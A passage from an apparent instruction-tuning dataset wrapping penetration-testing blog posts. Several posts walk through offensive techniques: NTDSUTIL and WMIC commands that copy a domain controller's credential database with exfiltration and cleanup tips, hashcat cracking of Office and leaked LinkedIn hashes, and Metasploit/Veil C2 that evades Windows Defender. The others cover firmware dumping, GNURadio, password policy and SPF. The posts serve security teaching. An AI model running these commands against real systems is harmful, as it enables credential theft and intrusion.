can't just romp on into the SYSTEMROOT SYSTEM32 directory and copy the files Well not technically true you can find backups of SAM and SYSTEM in the SYSTEMROOT SYSTEM32 CONFIG directory and it might well be possible to locate the files in a Volume Shadow Copy Alas even if you do locate these files they will be old by perhaps a day or a week There happens to be a fantastic tool located on a Windows domain controller called NTDSUTIL.EXE The NTDSUTIL tool is used for accessing and managing a Windows active directory database The tool should typically only be used by experienced system administrators but also has this wonderful penetration testing use case WARNING This tool is POWERFUL Do not experiment ad-hoc with NTDSUTIL unless using your own lab system It will directly interact with Active Directory databases and you might well destroy the domain The nice part about NTDSUTIL from a penetration testing perspective is that you can create a full active directory backup in IFM media mode in a completely safe manner Once you do this all that is left is to copy the files to where you need them for hash extraction and cracking purposes The upside of this method is a safe and relatively stealthy method of grabbing the data for your value-added service of cracking the hashes The downside of this method is that some Active Directory Databases are sizeable often several hundreds of megabytes or gigabytes in size In general I have found that ex-filtration works fairly well if you created an encrypted ZIP base64 encode and then download the result Specifically when using NTDSUTIL we are doing the following Setting the active instance to NTDS Entering IFM media creation mode Creating a full backup to a specified directory path Quitting out of IFM and then quitting from NTDSUTIL NTDSUTIL is normally a text menu-driven process however it is possible to specify each of the commands directly on the command line from CMD.EXE as follows C ntdsutil ac in ntds ifm cr fu c TEMP AD q q The most important thing to realize is that the C TEMP AD directory specified above must exist must be an empty directory and must have enough free disk space to hold the full database The other important thing is that you must have an administrative account in order to perform this operation In general I prefer to not use Remote Desktop Protocol but rather use WMIC to launch the required NTDSUTIL command One of the challenges with this is you end up with the age-old quotation escaping challenge in crafting your command Let's assume your target domain controller is 10.10.10.10 What you can do is map a drive to the domain controller create your directory to store the results and invoke WMIC to run your NTDSUTIL command A command sequence as follows should do the trick assuming you are resident on a regular workstation within the environment C NET USE Z 10.10.10.10 C USER DOMAIN Administrator C MKDIR Z TEMP AD C WMIC NODE 10.10.10.10 USER DOMAIN Administrator PASSWORD XXXXX process call create cmd.exe c ntdsutil ac in ntds ifm cr fu c TEMP AD q q You can check on the progress using the command while NTDSUTIL completes It may take a while especially if the active directory environment is large C DIR S Z TEMP AD After this completes your job is to compress the resulting files SYSTEM SAM and NTDS.DIT using ZIP with encryption optionally base64 encode and download the results to a Linux system you control The IMPACKET secretsdump script can then be used to extract all hashes in a format suitable for cracking with hashcat as follows python secretsdump.py -system SYSTEM -security SECURITY -ntds NTDS.DIT -outputfile outputfilename LOCAL After you have successfully exfiltrated the data please ensure that you clean up your mess on the domain controller itself I would suggest doing the following C Z Z CD TEMP AD Z TEMP AD RD S Q Active Directory Z TEMP AD RD S Q Registry Z C C NET USE Z DELETE If you have sufficient drive space on the local workstation you are working with another option is to create a share from your system and mount that share on the domain controller Subsequently you would create an empty directory on this share and use a similar NTDSUTIL command to create the backup of the database with this path The greatest advantage of following this sort of methodology when extracting hashes is that you are NOT endangering the LSASS.EXE process via any DLL injection and thus not risking a domain controller crash Another potential method to use is to abuse domain controller replication functionality with DCSYNC If you would like to read about this please refer to Harm Joy's blog at ww.harmj0y.net blog redteaming mimikatz-and-dcsync-and-extrasids-oh-my Happy hunting folks"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Crack Office Passwords with a Dictionary</title>\n<taxonomies>Author, External/Internal, How-To, Kent Ickler, Password Cracking, AES, CeWL, decrypt, dictionary, encryption, Exce, Hashcat, John the Ripper, JTR, Kent Ickler, LinkedIn, microsoft office, Office, SHA, wordlist</taxonomies>\n<creation_date>Thu, 10 May 2018 15:59:16 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Kent Ickler TLDR We use a custom dictionary to crack Microsoft Office document encryption Then we use a custom dictionary for pwnage in LinkedIn hash database Background I recently got a couple of questions about a better way to crack encrypted Excel files The question came from BHIS's extended community who is using commercial password-recovery tools with distributed CPU and GPU processing power The problem is they were still getting ridiculously slow hashing speeds making brute force unfitting In discussing our typical run-down of hashing on John the Ripper JTR and Hashcat the user responded with I used that 15 years ago people still do that Yes Yes we still do that In fact both JTR and Hashcat have active development to this day To be fair I can't say if a commercial software is faster better faster stronger but I will say that if it includes professional support and you're dealing with something complicated that's always nice to have There's a mantra that Black Hills Information Security SysAdmins have we are neither pro-proprietary nor pro-open source we are pro-security awareness Commercial software definitely can have its niche and a quick survey of Password Recovery software shows some interesting offerings especially regarding distributed workloads that the open-source community has struggled to find significant growth Office Encryption The slow hash-cracking is the result of efforts the Microsoft Office application puts into storing the password hash and encrypting the document The encryption methods are far more complex than they used to be in earlier Office versions Office 2013 encryption uses 128-bit AES using SHA-512 algorithm The more processing power used to create the hash the harder it is to attempt multiple combinations to find that matching hash Future Research Interestingly Microsoft also left a backdoor in all Office 2013 encrypted documents that allowed the use of a Master Key Microsoft even made DocRecrypt Tool that would allow an IT Admin to decrypt or re-crypt an Office document without the original password by using certificate-signing services on the domain These and other attack vectors have been researched by the community and could yield potential attack vectors that may entirely circumvent hash-cracking encrypted documents altogether Setup the Encrypted Document First I've created an Excel document and filled it with some fictitious data Now I'm going to Encrypt with a Password Let's try to use a password I figure might be in a common dictionary somewhere buckeye31 side note I used shuf -n 1 rockyou.txt After saving the document I try to open it again to verify its encrypted We don't want to actually crack the Excel file itself we just want to crack the hash of the password that was used to encrypt the Excel file To do this we need a tool that will read the Excel file and deliver us a plaintext-hash of the password used in the encryption processing of the file Now typically I'd refer to Hashcat-Utils but the tool I need isn't there Since we also have JTR compiled on the same cracking system I'm going to use JTR's office2john.py Office2john.py EXCEL FILE hash.txt Office2John.py identified the hash and determined it's using MS Office 2013's encryption method so despite using Office 2016 it looks like the hash mechanism is still the same I could use JTR here on out but I'm still partial to Hashcat despite having to look up the Hash-type code that I otherwise wouldn't have to if I just used JTR I'll need to cut the JTR Office 2013 hash into something that Hashcat will understand and I'll need to find the Hash method code from Hashcat's help file To convert this JTR formatted string so Hashcat can read it properly I need to remove the leading EncryptedBook.xlsx from the line created by office2john.py We could use Hashcat's --username flag but I prefer to create a clean hash-list file So I'll use cut Cut hash.txt -d -f 2 hashhc.txt Now let's give Hashcat some context With hashcat64.bin --help I can find that the Hast method code for Office 2013 is 9600 Real quick I want to check the benchmark for the 9600 hashing method on our HashCat rig Hashcat64.bin -m 9600 -b 47 178 h sec isn't great but it sure beats a few hundred Now the password I used is in rockyou.txt I did in fact pull it out randomly from that file Let's see how big our rockyou.txt is 14 344 393 Not counting overhead that's somewhere around 5 minutes Shoot let's go hashcat64.bin -m 9600 hasheshc.txt opt wordlists rockyou.txt -o hashes.pot Four minutes later Not surprising the password was found in rockyou.txt But what if we just knew it had some lowercase-letters followed by a couple of numbers hashcat64.bin -m 9600 -a 3 hasheshc.txt ?l?l?l?l?l?l?d?d -o hashes.pot SEVEN days Wow ouch Wait what if we just knew it was 8 characters but knew nothing else hashcat64.bin -m 9600 -a 3 hasheshc.txt ?a?a?a?a?a?a?a?a -o hashes.pot Well then Point is you can save yourself about 4577 years if you use a dictionary or an 8 character alphanumeric password is pretty good for MS Office encryption apparently What about a different approach I'm not a big football fan but if I knew the author of the Excel file was I might try to build a custom dictionary I'll use cewl to look for keywords about College Football on this Wikipedia page to help me build a dictionary file cewl --depth 0 -w customdict.txt n.wikipedia.org wiki List_of_college_team_nicknames_in_the_United_States This generated a custom dictionary of 1626 words Let's add all UPPER and lower in there too cp customdict.txt customdict.more.txt cat customdict.txt tr upper lower customdict.more.txt cat customdict.txt tr lower upper customdict.more.txt Now we're at 4878 words Let's go a bit farther and run hashcat-utils expander to expand out all those words Note I had to recompile expander to expand out to 8 characters cat customdict.more.txt opt hashcat-utils src expander.bin customdict.more.expanded.txt 392 322 words Now what Now let's add a couple of numbers at the end of the wordlist using hashcat's hybrid wordlist attack hashcat64.bin --session HashBlog1 -a 6 -m 9600 hashhc.txt customdict.more.expanded.txt ?d?d -o hash.pot AND In 27 seconds we had a winner Dictionaries are where it is at for process-intensive hashes If you're like most people and not using random alphanumerics and symbols anything someone knows about you including your sports preferences could be used in a word list to cut downtime cracking passwords only you think you know Hold on this was all fictitious and you knew the password to begin with No one would actually use those passwords Just for fun let's test our custom.more.expanded.txt word dictionary across a known hash-release of the LinkedIn 60M hash release Since it uses SHA1 and hashing will go insanely fast we're going to add a couple of alphanumeric's at the end of each word in our dictionary too hashcat64.bin -a 6 -m 100 68_hash.txt customdict.more.expanded.txt ?a?a -o test.pot We hit 1.27 of those 60 million LinkedIn hashes with our College Football sourced dictionary and it took 22 seconds Links DigINinja's CeWL igi.ninja projects cewl.php John the Ripper ww.openwall.com john Hashcat ashcat.net hashcat Hashcat-utils ithub.com hashcat hashcat-utils Microsoft Office Document Encryption echnet.microsoft.com en-us library cc179125.aspx Related Blogs Black Hills Information Security Hashcat Blogs ww.blackhillsinfosec.com tag hashcat Black Hills Information Security Password Cracking Rig Build ww.blackhillsinfosec.com build-password-cracker-nvidia-gtx-1080ti-gtx-1070 Black Hills Information Security How to Crack Passwords for Password Protected MS Office Documents ww.blackhillsinfosec.com crack-passwords-password-protected-ms-office-documents"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Hardware Hacking with Shikra</title>\n<taxonomies>How-To, Bus Pirate, hardware hacking, Shikra</taxonomies>\n<creation_date>Mon, 14 May 2018 14:54:22 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Rick Wisser Comparing Apples to Oranges Bus Pirate vs Shikra this a Hardware Hacking 101 webcast follow up blog post I recently did a hardware hacking webcast on hacking a router with the Bus Pirate The webcast can be found at ww.blackhillsinfosec.com webcast-hardware-hacking-101 In the webcast I made a comment on how long it took to dump the firmware off the chip with the bus pirate approximately 30 minutes Well here is a blog post with the same content but using the Shikra If you are not familiar with the Bus Pirate then you need to check out the webcast along with the dangerous prototypes website angerousprototypes.com docs Bus_Pirate The Bus Pirate as well as the Shikra are devices that enable a user to interact with different types of protocols Protocols such as JTAG SPI IC2 UART and GPIO via a USB interface In the webcast I talk about chip isolation and in the example I remove the chip off of the router so that it was totally isolated In this blog post we will start at that point with connecting the device Remember that I placed the chip with the firmware on the breakout board as shown below Now we need to examine the pin layouts for both the chip and the Shikra so that we can make the proper connections to interact with chip via the Shikra Pinouts and information about the Shikra can be found at nt3.cc products the-shikra The chip that we have is a MX25L6406E MX25L6408E A quick view of the data sheet provided the pinout of the device Also definitions of what each pin is utilized for was also observed The Shikra pinout is also needed to determine how to connect the breakout board chip to it Now that we have the pinouts we can wire them together as shown in the table below As like in the webcast a breadboard with a power supply was utilized to supply the voltage to the chip as well as make the connections in the table above Once the connections are made we are ready to dump the firmware With the Bus Pirate we used the following command Sudo flashrom -p buspirate_spi dev dev ttyUSB0 spispeed 1M -c MX25L6406E MX25L6408E -r spidump.bin The flashrom command sets up the type of protocol that the chip on the BusPirate is utilizing In this case flashrom has a BusPirate_spi specific protocol The command then identifies the device location ttyUSB0 and the speed to read the data note that any higher speed will become unstable The -c identifies the type of device to read from and the -r is to write the data to a file However with the Shikra we will still use flashrom but the command to use is Sudo flashrom -p ft2232_spi type 232H -c MX25L6406E MX25L6408E -r spidump.bin Where the flashrom command sets up the type of protocol that the chip on the Shikra is utilizing ft2232 and the type the -c identifies the type of device to read from and the -r is to write the data to a file By comparing the two read speeds it is apparent that the Shikra is much faster at reading the chip What takes the Bus Pirate 30 minutes to read the contents it only takes the Shikra 3 minutes To be fair I used the Bus Pirate version 3.6 for the testing Dangerous Prototypes has a new board called the Bus Blaster which uses the same ft2232 chip as the Shikra Who knows another blog post might be needed for comparison"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>C2, C3, Whatever It Takes</title>\n<taxonomies>C2, How-To, C2, command and control, metasploit</taxonomies>\n<creation_date>Thu, 17 May 2018 14:52:31 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Darin Roberts If you have been in the security field for any length of time at all you have heard the term C2 You might have heard it also called C C or Command and Control I will refer to it as C2 as here at BHIS that is what we do Some of you might wonder what exactly is C2 and those who might know what it is might not understand what it means and even more might not know how to set up a C2 It is really not uncommon to be talking with another tester and they will say something along the lines of I couldn't do X Y or Z so I just set up a C2 to bypass the problems So what exactly is a C2 and how does it work And even better how can I set one up First off what is C2 C2 is remotely controlling another system This can be a good thing I know that for me personally I love Remote Desktop and use it daily There are other common forms of C2 like VNC or SSH that are common as well They can be very beneficial and make working on computers much easier than physically being in front of the machine However where something can be used for good it can also be used for bad On the evil side of C2 malware is uploaded to a target host and then executed This malware has been pre-programmed to run and then to set up a communications channel to the command and control server on the internet The malware can be downloaded and installed in limitless ways It can come as an email attachment clicking on the wrong link downloading a trojan software plugging in a USB or any of another myriad of ways The result with C2 is the same you have given an avenue for an attacker to execute commands on your computer So how does C2 work The unsuspecting victim executes a command on their computer to install the malware After the malware is installed the malware will call out to the C2 server and wait for its next command It is usually going to send out a beacon on a time basis to let the server know it is still alive and to see if there is anything it should do When the server is ready it will issue its command to execute on the infected host machine Because the hosts are not sending constant data out of the network detecting these infected hosts can sometimes be difficult There are anti-virus programs that detect off-the-shelf C2 programs but they don't detect everything I was in a meeting just the other day when a co-worker said I always use custom C2 and bypass everything I know it will work How do you set up a C2 In this blog I will set up a C2 using Metasploit and Veil The host will be running Windows 10 with Windows Defender installed and in use The first step is to set up the listener using Metasploit Thanks to our great SysAdmins at BHIS I got a Kali instance set up just for this purpose Now that we have our listener set up we need to get the payload I first used Metasploit to create the payload I copied this C2.exe file to my Windows machine but Windows Defender didn't like it Windows Defender is a surprisingly good antivirus program However as this is not a review of AV solutions we will just try to see if we can bypass it I then used Veil-Evasion ithub.com Veil-Framework Veil-Evasion Now that we have the payload from Veil the file c2.bat let's copy it over to our Windows machine to see if it bypasses Windows Defender I created a folder on my desktop called C2 Folder I was able to just move this c2.bat file into my newly created folder and Windows Defender did not trigger it I want this file to run with administrator privileges so I will right-click on it and Run as administrator Click Yes to allow After I run the c2.bat file a session gets started on my Kali with the Meterpreter listener on it I want to interact with the session so I type the command sessions -i 1 On my Windows machine it doesn't look like anything is happening I could take a screenshot of that but it would be boring I don't want Windows to kill my process so I am going to change migrate to another process that is stable and that Windows likes Spool is a good idea Explorer is another popular choice Now that I know the PID for spool is 4188 I am going to change my PID to 4188 Now that I have access I am going to change directories to see what is out there I want to see what is in this file With a C2 session there are all kinds of fun things you can do but that is for another blog And for those of you who haven't seen Mr Mom or who are curious about the title of this blog post ww.youtube.com watch?v iX3kxAA2L4Q"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>GNURadio Can Make You Hear Laurel & Yanny</title>\n<taxonomies>Fun & Games, Informational, Factoria Labs, GNURadio, Laurel & Yanny, SDR, Software Defined Radio, Sound Experiments</taxonomies>\n<creation_date>Fri, 18 May 2018 16:12:29 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Paul Clark outu.be EXRoQGHx-80 Feeling uncomfortably productive today I've got a remedy for that involving internet memes and signal processing Come and waste a few minutes of your day with Laurel Yanny and GNURadio It's been going on for a couple of days so you're probably already wearying of the interpretive controversy centered around the audio clip In short some people listen to it and clearly hear the word Laurel while others clearly hear the word Yanni Although the academic brain trust hasn't yet converged on a consensus explanation there does appear to be some connection to the lower and higher frequency components of the audio This immediately got me thinking about how to use GNURadio to process the sound to produce both interpretations for the listener At this point you're probably thinking two things This guy must have something better to do and You can't use radio software to process audio While I'll concede the first point you can actually use GNURadio to do stuff like this Although GNURadio is designed for processing radio signals it actually possesses a host of general-purpose signal processing capabilities many of which can be applied to any digitized signal you want including an audio signal of dubious value I built the following flow-graph to produce three different variations of the clip the original a Laurelized version and a Yannified one The Audio Sink which is essentially your sound card plays the audio stream picked by the Selector-block which you control via the QT GUI Chooser If you select the Original option you'll simply hear an unmodified version of the original WAV file this sounds very clearly like Laurel to me but if you're one of those crazy Yanny people more power to you If you choose the Laurel button you'll get an audio stream passed through a Low Pass Filter that removes frequencies higher than 4.5 kHz Finally choosing the Yanny button results in a high pass filtered version that has any frequencies lower than 2 kHz removed This version of the audio is also slowed down slightly by the Rational Resampler block but this was just to clarify the sound a bit If you want to try this out for yourself you can clone my project at ithub.com paulgclark laurel-yanny You'll need GNURadio on your machine but you can take care of that on an Ubuntu install by typing sudo apt-get install gnuradio this won't give you the latest version of GNURadio but it's recent enough for this You can then change into the laurel-yanny directory and type gnuradio-companion laurel-yanny.grc Clicking the small play button in the toolbar will run the flowgraph I found that when I selected the Yanny button and moved the high pass filter cutoff to the left the Laurel sound became more clear Moving it to the right strengthened my ability to hear the Yanny sound At the midpoint my brain's audio interpretation actually started going back and forth between the two I was even able to think one of the words and induce my brain to perceive it It's wacky stuff people ______________ Paul Clark owns Factoria Labs an organization dedicated to the propagation of software-defined radio The more paranoid among you might suspect that this post was all just a ploy to get you to start using GNURadio to see how awesome it is"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Finding: Weak Password Policy</title>\n<taxonomies>Author, David Fletcher, Finding, Informational, bad passwords, password, password policy, weak password</taxonomies>\n<creation_date>Thu, 24 May 2018 15:15:15 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "David Fletcher The weak password policy finding is typically an indicator of one of two conditions during a test A password could be easily guessed using standard authentication mechanisms A password could be easily recovered after capturing crackable password hashes Password strength is a topic of serious contention within most of the organizations that we test There is a constant struggle between information security staff who want to protect the organization and the people who have to do the business that keeps it viable As IT and security personnel when we ask employees to construct complex passwords we usually end up with something like the following As expected we also get a similar response Easily Guessable Passwords Creating password policies like this will rarely work because users identify ways to create weak passwords that comply with the implemented policy Take for instance a password policy that requires an upper case character a lowercase character a number and a symbol which must be eight characters in length Some of the weak passwords that we commonly observe include things like Spring2018 February18 Password1 This isn't nearly exhaustive because we often find company names slogans and other region specific root words exhibiting the same pattern Users select these passwords because they are easy to remember easy to create and conforms with the policy The following XKCD comic illustrates this issue Attackers often engage in password guessing attacks like password spraying in an attempt to expand their access to other users in the environment Having easily guessed passwords makes this expansion possible Easily Cracked Passwords In addition to the ability to guess passwords attackers often have the opportunity to crack passwords within an environment When an attacker engages in password cracking they typically need password hashes to crack Often hashes can be obtained without any special permissions in an environment Abuse of protocols like Kerberos Link-Local Multicast Name Resolution and NetBIOS Name Service are typical attack vectors However they are not exclusive Careless application of share permissions can expose backup files that contain hashes as well If passwords are short then the attacker typically has an advantage As an example the BHIS dedicated password cracker can exhaust the entire 8-character password keyspace cracking NTLM hashes in a matter of a few hours For this reason BHIS urges its customers to consider a password policy that focuses on greater length than character set complexity We recommend the following The minimum passphrase length should be 15 characters Multiple dictionary words constituting a phrase should be permitted and encouraged Encourage title case in phrases and allow digit substitution for words The length of a password has much greater influence on the attacker's ability to crack that password in a reasonable amount of time before your next password change using brute force techniques Another XKCD comic illustrates this concept Other Considerations Having a strong password policy keeps attackers from guessing weak passwords and cracking hashes collected through various means In addition to strengthening your password policy measures should be taken to minimize or eliminate opportunities that assist attackers in collecting hashes In addition users should be encouraged NOT to reuse passwords across multiple accounts This is especially true when those accounts operate at different privilege levels An attacker who gains access to a single account may suddenly find instant access to many resources If users maintain a large number of passwords and have trouble remembering them the organization should consider the use of a reputable password manager application Where and how elevated privilege credentials are used should be carefully architected Memory analysis with tools like Mimikatz can reveal plain text credentials of any complexity on certain systems If possible protective measures should be placed on these systems like Credential Guard to prevent disclosure For ultimate protection administrators should operate on administrative-only workstations that lack internet browsing and email capabilities Finally for especially sensitive systems like Domain Controllers and internet facing logon interfaces that grant access to internal resources like email and VPN multi-factor authentication should be implemented On internal systems the technology should be usable with interactive console logon Remote Desktop Protocol etc and non-interactive sessions enter-pssession psexec etc Conclusion A strong password policy should be one of the cornerstones of your security program Users are constantly under attack using vectors like social engineering phishing and drive-by downloads Without a strong password policy the success of just one of these attacks could result in systemic compromise of an environment"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Configure SPFv1: Explained for the Masses</title>\n<taxonomies>Blue Team, How-To, Phishing, Best Practices, Blue Team, Derrick Rauch, DKIM, DMARC, Email, Filtering, Kent Ickler, Marketing, phishing, Sender Policy Framework, Spam, SPF</taxonomies>\n<creation_date>Tue, 29 May 2018 12:30:14 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Kent Ickler and Derrick Rauch Sun Protection Factor Err wait a second Sender Policy Framework Ladies and Gentlemen of the class of 1997 Wear Sunscreen...I will dispense my advice now Email forging exists in the web today thanks ustayready Sender Policy Framework SPF was created with origins back in 2005 RFC 4408 with more recent version updated in 2014 RFC 7208 and DKIM and DMARC updates It attempts to thwart forged emails by providing recipient-mail-servers a method to determine if the origination of the email was authorized to send mail on behalf of the domain in the FROM field of the email Recipient-mail servers then had the opportunity to determine if the inbound email should be considered more-likely forgery phishery or if more-likely legitimate If a recipient-mail-server receives email with a FROM address of an SPF authorized server it has reason to believe its a valid good email If a recipient-mail-server receives email with a FROM address of an SPF unauthorized server it has reason to believe it is an invalid bad email SPF records can also inform the recipient-mail-server what to do in case mail is received from an unauthorized mail server It can continue to deliver the email mark it for suspicion increase its risk rating or outright deny the email Of course the SPF record isn't the golden-rule The recipient-mail-server can follow whatever methodology it cares to take when considering the weight of SPF records The Marketing Spiel So Marketeers often struggle with this It's a SendGrid MailGun MailChimp ect dilema They bought this fancy new marketing email solicit tool but everyone keeps marking their campaign emails as spam If your Marketing group didn't take their time to ensure their SPF records for their FROM domain is accurate emails being received could more easily be considered spam malicious and sent to the Spam box ever to be forgotten Forward Thinking Sender Policy Framework isn't dying but it does have new brotherly love in the anti-spam and the anti-phisery departments DKIM and DMARC are newer frameworks that extend the validation that SPF started back in the day Together they attempt to build a network of trust between domain-ownership and recipient-mail-servers Check out future blog posts for discussion on DMARC and DKIM Domain Name Server Record The SPF record that authorizes a mail-server relay to be delivering emails is a DNS TXT record that must be entered on the Name Server as designated by the registrar Because this implies domain ownership it allows the owner of a domain to tell recipients if mail received with their domain in the FROM field was delivered by a mail server they expected The DNS record we discuss below must be created on the domain's name server as defined by NS record on the domain's registrar Syntaxing There are lots of tools to help you build SPF records but you still need to know what's going on SPF records are read by SMTP-Recipients left-to-right Upon first match the record analysis stops with the configured result DNS record type TXTHost whatever your primary TLD is or whatever domain you're trying to protect .Value SYNTAX The value key is where the meat of the record is so lets take a look v spf1 Mechanism-Action Mechanism-Who Mechanism-Action Mechanism-Who Mechanism-Action The action parameter tells the recipient mail server what to do Its syntax is below Pass email SPF record designates host is authorized mail accepted Fail email SPF Record designates host is not authorized mail rejected SoftFail SPF Record designates host is not authorized but meh maybe mark increase-risk Neutral SPF Record designates that it has no idea double-meh mail acepted_ Other action reults Mechanism-Who There are a lot of options here all Everserver everywhere ip4 Ip4 CIDR-Style ip6 ip6 CIDR-Style a domain Include all A-records of x-domain a domain CIDR Include the CIDR network of all a-records of xdomain a Include all a records of this domain a CIDR Include the CIDR network of all a-records of this domain mx Include the mx-records of this domain mx CIDR I nclude the CIDR network of all mx-records of this domain mx domain Include all mx-records of x-domain mx domain CIDR Include the CIDR network of all mx-records of xdomain ptr Include the IP of the ptr record of this domain ptr domain Include the IP of the ptr record of x-domain exists domain YES NO trigger If an A record exists Pass redirect domain Replace this entire SPF record with the SPF record of domain include domain Include the SPF records of domain Match pass no match fail This type record is used in most cases for large mail providers like Google Office ect This is also commonly used for mail-relays like SendGrid MailGun etc The include is a trust mechanism It allows you to proxy trust of who is authorized to send email from your domain organization onto the SPF records of another domain organization who you acknowledge to be responsible for sending your email These organizations often blanket their SPF records to cover all of their possible mail servers Examples v spf1 mx -all Accept email from this domains mx record reject from anywhere else v spf1 a AnotherDomain.com ?a google.com -all Accept email from a-records of AnotherDomain.com meh on a-records of Google.com but reject everything else v spf1 exists AnotherDomain.com -all Accept email if an a-record exists for AnotherDomain.com but reject if it doesn't v spf1 -all Reject email from this domain regardless of who sends it v spf1 include mailgun.com include sendgrid.com -all Follow rules in the SPF-Record for mailgun.com and sendgrid.com reject all others v spf1 redirect AnotherDomain.com Follow only the rules in the SPF-Record of AnotherDomain.com Marketeering again Back to that Marketing bit what are MailChimp MailGun and SendGrid doing Interestingly there's something to be said here if you're using a mail-relay or mass-mailing service The email can be considered authorized and you can break-through spam boxes But the red-teamer inside me would have to ask Can a third party just create an account over at a third party I've trusted and send email on my behalf without my explicit approval Well Yes and no These services can send email on your behalf if you configure your SPF record to authorize their mail server They each do some diligence to ensure that a third party cannot send email with your from address They do this by forcing users to validate their FROM domains prior to sending email on behalf of that domain Each service does this differently Some make dns records on their domains that should be included as a yourdomain.mailrelayservice.com which can provide you some reassurance Ultimately though you need to trust your mail servers and if you feel you can't do that well its a tough world and paralyzing paranoia will set in For more information on SPF Records and the like check out the links below Also stay tuned for our upcoming blogs on DKIM RFC 7372 and DMARC RFC 7489 SPF Record Generators There are platforms out there that can help build SPF records to fit your specific needs Most work very similar to each-other some even want money I wouldn't suggest paying for helping you create an SPF record but as always be careful when using free services That said MXToolbox has been in my SysAdmin and Blue-Team toolbox for years and hasn't let me down Build SPF Online xtoolbox.com SPFRecordGenerator.aspx Links Open Sender Policy Framework ww.openspf.org Project_OverviewBuild SPF Online xtoolbox.com SPFRecordGenerator.aspx SPF V1 RFC 7208 obs 4408 6652 ools.ietf.org rfc rfc7208.txtSPF V1 RFC 6652 obs by RFC-7208 ools.ietf.org html rfc6652SPF V1 RFC 4408 obs by RFC-7208 2006 ools.ietf.org html rfc4408ww.ietf.org rfc rfc4408.txt Upcoming Blogs Reading DKIM DMARC Domain-Based Message Authentication Reporting and Conformaice marc.org SPF V1 RFC 7960 Interoperability of DMARC ools.ietf.org rfc rfc7960.txtSPF V1 RFC 7489 DMARC ools.ietf.org rfc rfc7489.txtSPF V1 RFC 7372 -DKIM updated 7208 ools.ietf.org rfc rfc7372.txt But trust me on the Sunscreen ________ Kent Derrick are part of our sysadmin team what would we do without them"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>What I Wish I Would Have Known</title>\n<taxonomies>General InfoSec Tips & Tricks, Informational, InfoSec 101, advice, infosec, infosec 101</taxonomies>\n<creation_date>Thu, 31 May 2018 15:24:10 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
